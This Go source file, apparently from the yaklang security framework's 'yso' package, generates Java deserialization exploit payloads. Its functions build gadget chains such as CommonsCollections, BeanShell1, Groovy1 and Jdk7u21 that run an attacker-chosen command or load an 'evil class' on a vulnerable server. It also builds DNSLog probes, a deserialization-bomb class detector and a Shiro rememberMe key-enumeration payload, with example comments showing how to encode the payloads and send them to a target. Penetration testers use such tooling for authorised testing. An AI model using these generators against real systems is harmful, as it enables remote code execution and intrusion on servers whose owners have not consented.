package yso

import (
	"fmt"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yserx"
	"reflect"
)

type GadgetInfo struct {
	Name                string
	GeneratorName       string
	Generator           any
	NameVerbose         string
	Help                string
	YakFun              string
	SupportTemplateImpl bool
}

func (g *GadgetInfo) GetNameVerbose() string {
	return g.NameVerbose
}
func (g *GadgetInfo) GetName() string {
	return g.Name
}
func (g *GadgetInfo) GetHelp() string {
	return g.Help
}
func (g *GadgetInfo) IsSupportTemplate() bool {
	return g.SupportTemplateImpl
}

func IsTemplateImpl(name GadgetType) bool {
	cfg, ok := YsoConfigInstance.Gadgets[name]
	if !ok {
		return false
	}
	return cfg.IsTemplateImpl
}

var AllGadgets = map[GadgetType]*GadgetInfo{}

func init() {
	for name, cfg := range YsoConfigInstance.Gadgets {
		name := name
		cfg := cfg
		var f any
		if cfg.IsTemplateImpl {
			f = func(options ...GenClassOptionFun) (*JavaObject, error) {
				var anyOpts []any
				for _, opt := range options {
					anyOpts = append(anyOpts, opt)
				}
				return GenerateGadget(name, anyOpts...)
			}
		} else {
			f = func(cmd string) (*JavaObject, error) {
				return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
			}
		}
		AllGadgets[name] = &GadgetInfo{
			Name:                string(name),
			NameVerbose:         string(name),
			Generator:           f,
			GeneratorName:       string(name),
			Help:                cfg.Desc,
			SupportTemplateImpl: cfg.IsTemplateImpl,
			YakFun:              fmt.Sprintf("Get%sJavaObject", name),
		}
	}
}

type JavaObject struct {
	yserx.JavaSerializable
	verbose *GadgetInfo
}

func (a *JavaObject) Verbose() *GadgetInfo {
	return a.verbose
}

var verboseWrapper = func(y yserx.JavaSerializable, verbose *GadgetInfo) *JavaObject {
	return &JavaObject{
		y,
		verbose,
	}
}

type TemplatesGadget func(options ...GenClassOptionFun) (*JavaObject, error)
type RuntimeExecGadget func(cmd string) (*JavaObject, error)
type GenGadgetOptionFun func(*GenerateGadgetConfig)
type GenerateGadgetConfig struct {
	ChainType string
	Args      []string
}

func SetTransformChainTypeByMap(s string, params map[string]string) GenGadgetOptionFun {
	return func(config *GenerateGadgetConfig) {
		config.ChainType = s
		if v, ok := YsoConfigInstance.ReflectChainFunction[GadgetType(s)]; ok {
			for _, arg := range v.Args {
				if val, ok := params[string(arg.Name)]; ok {
					config.Args = append(config.Args, val)
				} else {
					config.Args = append(config.Args, "")
				}
			}
		}
	}
}

func SetTransformChainType(s string, args ...string) GenGadgetOptionFun {
	return func(config *GenerateGadgetConfig) {
		config.ChainType = s
		config.Args = args
	}
}

func GenerateGadget(name GadgetType, opts ...any) (*JavaObject, error) {
	genConfig := &GenerateGadgetConfig{}
	var genClassesOpt []GenClassOptionFun
	for _, opt := range opts {
		switch f := any(opt).(type) {
		case GenGadgetOptionFun:
			f(genConfig)
		case GenClassOptionFun:
			genClassesOpt = append(genClassesOpt, f)
		default:
			return nil, utils.Errorf("unknown option type: %v(need type GenGadgetOptionFun or GenClassOptionFun)", reflect.TypeOf(opt).String())
		}
	}
	cfg, ok := YsoConfigInstance.Gadgets[name]
	if !ok {
		return nil, utils.Errorf("not found template: %s", name)
	}
	if cfg.IsTemplateImpl {
		templ := cfg.Template
		classObj, err := GenerateClass(genClassesOpt...)
		if err != nil {
			return nil, err
		}
		classObj, err = GenerateClassWithType(ClassTemplateImplClassLoader, SetClassBytes(classObj.Bytes())) // load target class by TemplateImpl loader that can load any class
		if err != nil {
			return nil, err
		}
		objs, err := yserx.ParseJavaSerialized(templ)
		if err != nil {
			return nil, err
		}
		obj := objs[0]
		err = SetJavaObjectClass(obj, classObj)
		if err != nil {
			return nil, utils.Errorf("config gadget %s class object failed: %v", name, err)
		}
		return verboseWrapper(obj, AllGadgets[name]), nil
	} else {
		chainType := genConfig.ChainType
		if chainType == "" {
			chainType = "raw_cmd"
		}
		template, ok := cfg.ChainTemplate[chainType]
		if !ok {
			return nil, utils.Errorf("not support transform chain type: %s", chainType)
		}
		objs, err := yserx.ParseJavaSerialized(template)
		if err != nil {
			return nil, err
		}
		if len(objs) <= 0 {
			return nil, utils.Error("parse gadget error")
		}
		obj := objs[0]
		if len(genConfig.Args) == 0 {
			return nil, utils.Errorf("transform chain template need at least one arg")
		}
		for i, arg := range genConfig.Args {
			err = ReplaceStringInJavaSerilizable(obj, fmt.Sprintf("{{param%d}}", i), arg, 1)
			if err != nil {
				return nil, err
			}
		}
		return verboseWrapper(obj, AllGadgets[name]), nil
	}
}

// GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。
// 此函数使用ParseJavaSerialized方法来解析提供的字节序列，
// 并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，
// 函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。
// byt：要解析的字节数组。
// 返回：成功时返回第一个Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// raw := "rO0..." // base64 Java serialized object
// bytes = codec.DecodeBase64(raw)~ // base64解码
// javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
// ```
func GetJavaObjectFromBytes(byt []byte) (*JavaObject, error) {
	objs, err := yserx.ParseJavaSerialized(byt)
	if err != nil {
		return nil, err
	}
	if len(objs) <= 0 {
		return nil, utils.Error("parse gadget error")
	}
	obj := objs[0]
	return verboseWrapper(obj, &GadgetInfo{}), nil
}

// GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。
// 它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。
// cmd：要传入Java对象的命令字符串。
// 返回：成功时返回修改后的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, err := yso.GetBeanShell1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetBeanShell1JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(GadgetBeanShell1, SetTransformChainType("raw_cmd", cmd))
}

// GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, err := yso.GetCommonsCollections1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollections1, SetTransformChainType("raw_cmd", cmd))
}

// GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollections5, SetTransformChainType("raw_cmd", cmd))
}

// GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollections6, SetTransformChainType("raw_cmd", cmd))
}

// GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollections7, SetTransformChainType("raw_cmd", cmd))
}

// GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollectionsK3, SetTransformChainType("raw_cmd", cmd))
}

// GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollectionsK4, SetTransformChainType("raw_cmd", cmd))
}

// GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。
// 这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。
// cmd：要设置在Java对象中的命令字符串。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// javaObject, _ = yso.GetGroovy1JavaObject(command)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// hexPayload = codec.EncodeToHex(gadgetBytes)
// println(hexPayload)
// ```
func GetGroovy1JavaObject(cmd string) (*JavaObject, error) {
	return GenerateGadget(GadgetGroovy1, SetTransformChainType("raw_cmd", cmd))
}

// GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。
// 用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数允许用户定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetClick1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command),
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className),
//	)
//
// ```
func GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetClick1, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(
//
//	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//		yso.obfuscationClassConstantPool(),
//		yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsBeanutils1, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。
// 去除了对 commons-collections:3.1 的依赖。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsBeanutils2_183, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。
// 去除了对 commons-collections:3.1 的依赖。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsBeanutils2, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections2JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollections2, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections3JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollections3, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections4JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollections4, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollections8JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollections8, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollectionsK1JavaObject 基于Commons Collections <=3.2.1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollectionsK1, utils.InterfaceToSliceInterface(options)...)
}

// GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetCommonsCollectionsK2, utils.InterfaceToSliceInterface(options)...)
}

// GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJBossInterceptors1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetJBossInterceptors1, utils.InterfaceToSliceInterface(options)...)
}

// GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJSON1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetJSON1, utils.InterfaceToSliceInterface(options)...)
}

// GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJavassistWeld1JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	//objs, err := yserx.ParseJavaSerialized(template_ser_JavassistWeld1)
	//if err != nil {
	//	return nil, err
	//}
	//obj := objs[0]
	//return verboseWrapper(obj, AllGadgets["JavassistWeld1"]), nil

	return GenerateGadget(GadgetJavassistWeld1, utils.InterfaceToSliceInterface(options)...)
}

// GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJdk7u21JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetJdk7u21, utils.InterfaceToSliceInterface(options)...)
}

// GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。
// 通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。
// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command = "whoami"
// className = "KEsBXTRS"
// gadgetObj,err = yso.GetJdk8u20JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
// ```
func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return GenerateGadget(GadgetJdk8u20, utils.InterfaceToSliceInterface(options)...)
}

// GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。
// 这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
// url：要在生成的Java对象中设置的URL字符串。
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// url, token, _ = risk.NewDNSLogDomain()
// javaObject, _ = yso.GetURLDNSJavaObject(url)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
// res,err = risk.CheckDNSLogByToken(token)
//
//	if err {
//	  //dnslog查询失败
//	} else {
//	  if len(res) > 0{
//	   // dnslog查询成功
//	  }
//	}
//
// ```
func GetURLDNSJavaObject(url string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(template_ser_URLDNS)
	if err != nil {
		return nil, err
	}
	err = ReplaceStringInJavaSerilizable(obj, "1.1.1.1", url, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:                "URLDNS",
		NameVerbose:         "URLDNS",
		SupportTemplateImpl: false,
		Help:                "",
	}), nil
}

// GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。
// 使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
// url：要在生成的Java对象中设置的URL字符串。
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// url, token, _ = risk.NewDNSLogDomain()
// javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
// res,err = risk.CheckDNSLogByToken(token)
//
//	if err {
//	  //dnslog查询失败
//	} else {
//	  if len(res) > 0{
//	   // dnslog查询成功
//	  }
//	}
//
// ```
func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(tmeplate_ser_GADGETFINDER)
	if err != nil {
		return nil, err
	}
	err = ReplaceStringInJavaSerilizable(obj, "{{DNSURL}}", url, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:                "FindGadgetByDNS",
		NameVerbose:         "FindGadgetByDNS",
		SupportTemplateImpl: false,
		Help:                "",
	}), nil
}

// GetFindClassByBombJavaObject 目标存在指定的 ClassName 时,将会耗部分服务器性能达到间接延时的目的
// 使用预定义的FindClassByBomb序列化模板，然后在序列化对象中替换预设的ClassName占位符为提供的ClassName字符串。
// className：要批判的目标服务器是否存在的Class Name值。
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// javaObject, _ = yso.GetFindClassByBombJavaObject("java.lang.String") // 检测目标服务器是否存在 java.lang.String 类
// gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器,通过响应时间判断目标服务器是否存在 java.lang.String 类
// ```
func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(tmeplate_ser_FindClassByBomb)
	if err != nil {
		return nil, err
	}
	err = ReplaceClassNameInJavaSerilizable(obj, "{{ClassName}}", className, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:                "FindClassByBomb",
		NameVerbose:         "FindClassByBomb",
		SupportTemplateImpl: false,
		Help:                "通过构造反序列化炸弹探测Gadget",
	}), nil
}

// GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。
// 主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。
// 使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。
// Example:
// ```
// javaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()
// classBytes,_ = yso.ToBytes(javaObject)
// data = codec.PKCS5Padding(classBytes, 16)
// keyDecoded,err = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")
// iv = []byte(ramdstr(16))
// cipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)
// payload = codec.EncodeBase64(append(iv, cipherText...))
// 发送 payload
// ```
func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(template_ser_simplePrincipalCollection)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:                "SimplePrincipalCollection",
		NameVerbose:         "SimplePrincipalCollection",
		SupportTemplateImpl: false,
		Help:                "",
	}), nil
}

// GetAllGadget 获取所有的支持的Gadget
// Example:
// ```
// dump(yso.GetAllGadget())
// ```

func GetAllGadget() []interface{} {
	var allGadget []any
	for name, cfg := range YsoConfigInstance.Gadgets {
		name := name
		cfg := cfg
		var f any
		if cfg.IsTemplateImpl {
			f = func(options ...GenClassOptionFun) (*JavaObject, error) {
				anyOpts := []any{}
				for _, opt := range options {
					anyOpts = append(anyOpts, opt)
				}
				return GenerateGadget(name, anyOpts...)
			}
		} else {
			f = func(cmd string) (*JavaObject, error) {
				return GenerateGadget(name, SetTransformChainType("raw_cmd", cmd))
			}
		}
		allGadget = append(allGadget, f)
	}
	return allGadget
}

// GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget
// Example:
// ```
//
//	for _, gadget := range yso.GetAllTemplatesGadget() {
//		domain := "xxx.dnslog" // dnslog 地址
//		javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
//		if javaObj == nil || err != nil {
//			continue
//		}
